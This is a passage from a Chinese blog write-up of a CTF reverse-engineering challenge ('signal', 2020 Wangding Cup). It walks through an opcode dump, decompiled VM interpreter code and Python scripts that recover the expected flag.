class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="comment">#获得逆序，这里会直接变成10进制</span></span><br><span class="line"><span class="comment">#print(a[::-1])</span></span><br><span class="line">b=a[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i,<span class="string">&#x27;,&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">122 ,7 ,30 ,7 ,255 ,255 ,255 ,193 ,7 ,255 ,255 ,255 ,132 ,7 ,40 ,7 ,255 ,255 ,255 ,241 ,7 ,49 ,7 ,255 ,255 ,255 ,167 ,7 ,24 ,7 ,51 ,7 ,114 ,7 ,50 ,7 ,52 ,7 ,63 ,7 ,34 ,7 ,1 ,12 ,8 ,65 ,2 ,1 ,32 ,3 ,8 ,9 ,4 ,1 ,37 ,2 ,8 ,3 ,5 ,1 ,1 ,5 ,8 ,32 ,2 ,1 ,65 ,4 ,8 ,54 ,2 ,1 ,37 ,2 ,8 ,2 ,5 ,1 ,11 ,8 ,12 ,1 ,36 ,4 ,8 ,81 ,2 ,1 ,32 ,3 ,8 ,9 ,4 ,1 ,11 ,8 ,11 ,1 ,33 ,3 ,8 ,3 ,5 ,1 ,4 ,4 ,8 ,12 ,1 ,11 ,8 ,2 ,3 ,1 ,3 ,5 ,8 ,32 ,4 ,1 ,5 ,3 ,8 ,16 ,4 ,10 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>





<p>回到main函数，跟进vm_operad，传入了v4数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">200</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v9;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v9] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v3[v6 + <span class="number">100</span>] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] + v3[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = v3[v8] - LOBYTE(a1[v9 + <span class="number">1</span>]);</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] ^ v3[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] * v3[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v3[v7 + <span class="number">100</span>] != a1[v9 + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v3[v5] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(v3);</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = v3[v8] - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = v3[v8] + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里大概知道了，v8,v9,v6是用来进行v4与v3赋值的，v3就是我们输入的flag，v8,v9,v6都初始化为0，Switch函数中是对a1数组中的值，这个函数名也告诉我们应该是vm逆向，就是虚拟机逆向</p>
<p>自己定义一套指令，在程序中能有一套函数和结构解释自己定义的指令并执行功能。</p>
<p>这些Switch就是指令集的选择了只有当选择7的时候，输入的flag才会和v4数组里面数为7的下一位进行比较</p>
<p>先筛选出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">122</span> ,<span class="number">7</span> ,<span class="number">30</span> ,<span class="number">7</span> ,<span class="number">255</span> ,<span class="number">255</span> ,<span class="number">255</span> ,<span class="number">193</span> ,<span class="number">7</span> ,<span class="number">255</span> ,<span class="number">255</span> ,<span class="number">255</span> ,<span class="number">132</span> ,<span class="number">7</span> ,<span class="number">40</span> ,<span class="number">7</span> ,<span class="number">255</span> ,<span class="number">255</span> ,<span class="number">255</span> ,<span class="number">241</span> ,<span class="number">7</span> ,<span class="number">49</span> ,<span class="number">7</span> ,<span class="number">255</span> ,<span class="number">255</span> ,<span class="number">255</span> ,<span class="number">167</span> ,<span class="number">7</span> ,<span class="number">24</span> ,<span class="number">7</span> ,<span class="number">51</span> ,<span class="number">7</span> ,<span class="number">114</span> ,<span class="number">7</span> ,<span class="number">50</span> ,<span class="number">7</span> ,<span class="number">52</span> ,<span class="number">7</span> ,<span class="number">63</span> ,<span class="number">7</span> ,<span class="number">34</span> ,<span class="number">7</span> ,<span class="number">1</span> ,<span class="number">12</span> ,<span class="number">8</span> ,<span class="number">65</span> ,<span class="number">2</span> ,<span class="number">1</span> ,<span class="number">32</span> ,<span class="number">3</span> ,<span class="number">8</span> ,<span class="number">9</span> ,<span class="number">4</span> ,<span class="number">1</span> ,<span class="number">37</span> ,<span class="number">2</span> ,<span class="number">8</span> ,<span class="number">3</span> ,<span class="number">5</span> ,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">5</span> ,<span class="number">8</span> ,<span class="number">32</span> ,<span class="number">2</span> ,<span class="number">1</span> ,<span class="number">65</span> ,<span class="number">4</span> ,<span class="number">8</span> ,<span class="number">54</span> ,<span class="number">2</span> ,<span class="number">1</span> ,<span class="number">37</span> ,<span class="number">2</span> ,<span class="number">8</span> ,<span class="number">2</span> ,<span class="number">5</span> ,<span class="number">1</span> ,<span class="number">11</span> ,<span class="number">8</span> ,<span class="number">12</span> ,<span class="number">1</span> ,<span class="number">36</span> ,<span class="number">4</span> ,<span class="number">8</span> ,<span class="number">81</span> ,<span class="number">2</span> ,<span class="number">1</span> ,<span class="number">32</span> ,<span class="number">3</span> ,<span class="number">8</span> ,<span class="number">9</span> ,<span class="number">4</span> ,<span class="number">1</span> ,<span class="number">11</span> ,<span class="number">8</span> ,<span class="number">11</span> ,<span class="number">1</span> ,<span class="number">33</span> ,<span class="number">3</span> ,<span class="number">8</span> ,<span class="number">3</span> ,<span class="number">5</span> ,<span class="number">1</span> ,<span class="number">4</span> ,<span class="number">4</span> ,<span class="number">8</span> ,<span class="number">12</span> ,<span class="number">1</span> ,<span class="number">11</span> ,<span class="number">8</span> ,<span class="number">2</span> ,<span class="number">3</span> ,<span class="number">1</span> ,<span class="number">3</span> ,<span class="number">5</span> ,<span class="number">8</span> ,<span class="number">32</span> ,<span class="number">4</span> ,<span class="number">1</span> ,<span class="number">5</span> ,<span class="number">3</span> ,<span class="number">8</span> ,<span class="number">16</span> ,<span class="number">4</span> ,<span class="number">10</span> ]</span><br><span class="line">c=a[::-<span class="number">1</span>]</span><br><span class="line">b=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> c[i]==<span class="number">7</span>:</span><br><span class="line">        b.append(c[i+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#[34, 63, 52, 50, 114, 51, 24, 167, 49, 241, 40, 132, 193, 30, 122]</span></span><br></pre></td></tr></table></figure>

<p>这里之所以要逆序回来，是因为内存中的处理好像没有逆序，这里算是一个知识盲点吧，不太清楚，是看了其他师傅的wp，这个15位数组应该就是我们输入的flag了，分支2,3,4,5，11,12就是对输入flag的加密，然后分支1和8对v3进行</p>
<p>这里面有个LOBYTE这个函数，做的时候我去百度了有说是取最右边那位，有说右边四位，没有统一的说法，找了其他师傅的wp，说这是ida的函数，可以忽略这个函数</p>
<p>脚本参考了一下这两个师傅的wp</p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-259595.htm">原创]2020网鼎杯青龙组_re_signal-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p>[(117条消息) BUUCTF_<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45149832/article/details/126989759">网鼎杯 2020 青龙组]singal_buuctf [网鼎杯 2020 青龙组]singal_45149832的博客-CSDN博客</a></p>
<p>根据opcode分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10L</span>, <span class="comment">//输入</span></span><br><span class="line"><span class="number">4L</span>, <span class="number">16L</span>, <span class="number">8L</span>, <span class="number">3L</span>, <span class="number">5L</span>, <span class="number">1L</span>, <span class="comment">// 1次运算</span></span><br><span class="line"><span class="number">4L</span>, <span class="number">32L</span>, <span class="number">8L</span>, <span class="number">5L</span>, <span class="number">3L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">3L</span>, <span class="number">2L</span>, <span class="number">8L</span>, <span class="number">11L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">12L</span>, <span class="number">8L</span>, <span class="number">4L</span>, <span class="number">4L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">5L</span>, <span class="number">3L</span>, <span class="number">8L</span>, <span class="number">3L</span>, <span class="number">33L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">11L</span>, <span class="number">8L</span>, <span class="number">11L</span>, <span class="number">1L</span>,</span><br><span class="line"><span class="number">4L</span>, <span class="number">9L</span>, <span class="number">8L</span>, <span class="number">3L</span>, <span class="number">32L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">2L</span>, <span class="number">81L</span>, <span class="number">8L</span>, <span class="number">4L</span>, <span class="number">36L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">12L</span>, <span class="number">8L</span>, <span class="number">11L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">5L</span>, <span class="number">2L</span>, <span class="number">8L</span>, <span class="number">2L</span>, <span class="number">37L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">2L</span>, <span class="number">54L</span>, <span class="number">8L</span>, <span class="number">4L</span>, <span class="number">65L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">2L</span>, <span class="number">32L</span>, <span class="number">8L</span>, <span class="number">5L</span>, <span class="number">1L</span>, <span class="number">1L</span>,</span><br><span class="line"><span class="number">5L</span>, <span class="number">3L</span>, <span class="number">8L</span>, <span class="number">2L</span>, <span class="number">37L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">4L</span>, <span class="number">9L</span>, <span class="number">8L</span>, <span class="number">3L</span>, <span class="number">32L</span>, <span class="number">1L</span>, </span><br><span class="line"><span class="number">2L</span>, <span class="number">65L</span>, <span class="number">8L</span>, <span class="number">12L</span>, <span class="number">1L</span>, <span class="comment">// 刚好15次计算</span></span><br><span class="line"></span><br><span class="line"><span class="number">7L</span>, <span class="number">34L</span>, <span class="number">7L</span>, <span class="number">63L</span>, <span class="number">7L</span>, <span class="number">52L</span>, <span class="number">7L</span>, <span class="number">50L</span>, <span class="number">7L</span>, <span class="number">114L</span>, <span class="number">7L</span>, <span class="number">51L</span>, <span class="number">7L</span>, <span class="number">24L</span>, <span class="number">7L</span>, <span class="number">4294967207L</span>, <span class="number">7L</span>, <span class="number">49L</span>, <span class="number">7L</span>, <span class="number">4294967281L</span>, <span class="number">7L</span>, <span class="number">40L</span>, <span class="number">7L</span>, <span class="number">4294967172L</span>, <span class="number">7L</span>, <span class="number">4294967233L</span>, <span class="number">7L</span>, <span class="number">30L</span>, <span class="number">7L</span>, <span class="number">122L</span><span class="comment">// 这些是在验证v4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>每一轮的操作如下，这里省略了操作数下标的增加，以及最后case1的赋值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4[0] = (a1[2] ^ v3[0]) - LOBYTE(a1[5]); -&gt; v3[0] = (v4[0] + LOBYTE(a1[5])) ^ a1[2];</span></span><br><span class="line">v5 = a1[<span class="number">2</span>] ^ v3[<span class="number">0</span>];</span><br><span class="line">v3[<span class="number">0</span>] = v5;</span><br><span class="line">v5 = v3[<span class="number">0</span>] - LOBYTE(a1[<span class="number">5</span>]);</span><br><span class="line">v4[<span class="number">0</span>] = v5; <span class="comment">// v4[0] = 34L</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[1] = a1[11] * (a1[8] ^ v3[1]); -&gt; v3[1] = (v4[1] / a1[11]) ^ a1[8];</span></span><br><span class="line">v5 = a1[<span class="number">8</span>] ^ v3[<span class="number">1</span>];</span><br><span class="line">v3[<span class="number">1</span>] = v5;</span><br><span class="line">v5 = a1[<span class="number">11</span>] * v3[<span class="number">1</span>];</span><br><span class="line">v4[<span class="number">1</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[2] = v3[2] - LOBYTE(a1[14]) -1; -&gt; v3[2] = v4[2] + LOBYTE(a1[14]) +1;</span></span><br><span class="line">v5 = v3[<span class="number">2</span>] - LOBYTE(a1[<span class="number">14</span>])</span><br><span class="line">v3[<span class="number">2</span>] = v5;</span><br><span class="line">v5 = v3[<span class="number">2</span>] - <span class="number">1</span>;</span><br><span class="line">v4[<span class="number">2</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// v4[3] = a1[21] ^ (v3[3] + 1); -&gt; v3[3] = (a1[21] ^ v4[3]) -1;</span></span><br><span class="line">v5 = v3[<span class="number">3</span>] + <span class="number">1</span>;</span><br><span class="line">v3[<span class="number">3</span>] = v5;</span><br><span class="line">v5 = a1[<span class="number">21</span>] ^ v3[<span class="number">3</span>];</span><br><span class="line">v4[<span class="number">3</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[4] = (a1[24] * v3[4]) - LOBYTE(a1[27]); -&gt; v3[4] = (v4[4] + LOBYTE(a1[27])) / a1[24];</span></span><br><span class="line">v5 = a1[<span class="number">24</span>] * v3[<span class="number">4</span>];</span><br><span class="line">v3[<span class="number">4</span>] = v5;</span><br><span class="line">v5 = v3[<span class="number">4</span>] - LOBYTE(a1[<span class="number">27</span>]);</span><br><span class="line">v4[<span class="number">4</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[5] = (v3[5] - 1) - 1; -&gt; v3[5] = (v4[5] + 1) + 1;</span></span><br><span class="line">v5 = v3[<span class="number">5</span>] - <span class="number">1</span>;</span><br><span class="line">v3[<span class="number">5</span>] = v5;</span><br><span class="line">v5 = v3[<span class="number">5</span>] - <span class="number">1</span>;</span><br><span class="line">v4[<span class="number">5</span>] = v5;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v4[6] = (a1[34] ^ v3[6]) - LOBYTE(a1[37]); -&gt; v3[6] = (v4[6] + LOBYTE(a1[37])) ^ a1[34];</span></span><br><span class="line">v5 = a1[<span class="number">34</span>] ^ v3[<span class="number">6</span>];</span><br><span class="line">v3[<span class="number">6</span>] = v5;</span><br><span class="line">v5 = v3[<span class="number">6</span>] - LOBYTE(a1[<span 